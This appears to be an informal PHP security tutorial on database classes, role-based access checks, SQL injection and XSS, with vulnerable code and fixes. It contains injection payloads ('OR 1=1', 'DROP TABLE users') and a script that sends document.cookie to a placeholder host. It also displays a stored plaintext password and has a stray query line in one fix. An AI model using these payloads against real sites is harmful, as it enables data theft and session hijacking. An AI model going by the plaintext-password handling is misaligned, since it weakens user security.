## OOP 
in our code we use quires in every file we need it and this is an mess
this is a repeat and this will lead to 
- little safe because we pass the variable in the query 
- hard in Debbugging 
- hard in maintain 

we will make a class for the DataBase  this class will be the only respoinsible for connect and read from Data Base  

```php
<?php

class Database {

    
    protected function connect() {
   
    }

    protected function db_read($query) {
        
        $connection = $this->connect(); 
        
        
    }
}
```
##  Error Message 

when the user try to login you must make the error message if the email or password wrong 
the same like that "Wrong email or password " 


## Access Control (Privileges) 
in our code any logged in user can access any page and this is a mess
this is a huge security risk and this will lead to 
- no difference between Admin and normal User
- hard to manage permissions 
- if an editor account gets hacked, the whole system is in danger

we will add a 'rank' column in the DataBase and make an `access()` function  this function will be the only responsible for checking if the user has the right permission to see the page

```php
<?php

function access($needed_rank) {

    // Get user rank from session
    $user_rank = isset($_SESSION['user_rank']) ? $_SESSION['user_rank'] : '';

    switch ($needed_rank) {
        
        case 'admin':
            $allowed = ['admin'];
            break;

        case 'editor':
            $allowed = ['editor', 'admin'];
            break;

        case 'user':
            $allowed = ['user', 'editor', 'admin'];
            break;

        default:
            return false;
    }

    if (in_array($user_rank, $allowed)) {
        return true; 
    }

    return false; 
}
```

## SQL Injection

If we have posts and every post has an **id**, we take this id from the URL and put it in our query to fetch the data for this id.

and we do it like this:

```php
// GET -> super global to take id from url
$id = $_GET['id']; // returns a value like 1

// This query is very bad because we take the input or variable
// and inline it directly in the query
$query = "SELECT * FROM posts WHERE id = {$id}";

$statement = $pdo->query($query);
// and here the query is executed directly
```

If the user adds **malicious code** like this:

```
id = 5 OR 1=1
```

this will retrieve **all data**, not only the data for a specific id.

The attacker can also try something like:

```
DROP TABLE users
```

and if the query is executed, this can be a disaster.

---

### The Solution

The solution is **Prepared Statements**.

We separate the query from the variable.

The query goes to MySQL first to be prepared and checked,  
then the variable is sent separately and treated as **data**, not as a command.

like this:

```php
$id = $_GET['id'];

$query = "SELECT * FROM posts WHERE id = ?";

$statement = $pdo->prepare($query);
$statement->execute([$id]);
```

This is a **safe way** and helps avoid **SQL Injection**.


## XSS

If we have a profile page and the user has a **password** or a **bio**, we take this data from the database and print it on the screen.

and we do it like this:

```php
// Fetching user data from the database
$password = $user['password']; // returns the user's saved password

// This is very bad because we take the input or variable
// and inline it directly in the HTML page
echo "Your password is: {$password}";
```

If the user adds **malicious code** like this during signup:

```html
<script>alert('hacked')</script>
```

this will execute **JavaScript code** directly in the browser, not just display the text.

The attacker can also try something like:

```html
<script>document.location='http://hacker.com/?cookie='+document.cookie</script>
```

and if the code is executed, they can steal your session, which can be a disaster.

---

### The Solution

The solution is **Data Sanitization**.

We clean the data from any tags before displaying it.

The data goes through a built-in function to be converted into HTML entities,  
then the variable is sent to the browser and treated as **text**, not as a command.

like this:

```php
$password = $user['password'];

$query = "SELECT * FROM posts WHERE id = ?";

// We use htmlspecialchars to sanitize the output
$safe_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

echo "Your password is: {$safe_password}";
```

This is a **safe way** and helps avoid **XSS**.